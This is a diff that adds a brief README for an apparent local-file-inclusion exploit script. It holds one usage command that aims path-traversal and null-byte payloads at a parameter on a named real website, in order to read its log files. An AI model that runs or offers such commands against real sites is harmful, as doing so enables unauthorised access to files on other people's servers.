@@ -1,0 +1,9 @@
+Stupid LFI (local file inclusion) exploiter.
+try to find some logs via vulnerable parameter.
+
+Usage example:
+
+----
+./lfi.py  -u "http://povstanets.kiev.ua/index.php" -p "do" -r "../../../../../.." -e "%00"
+----
+
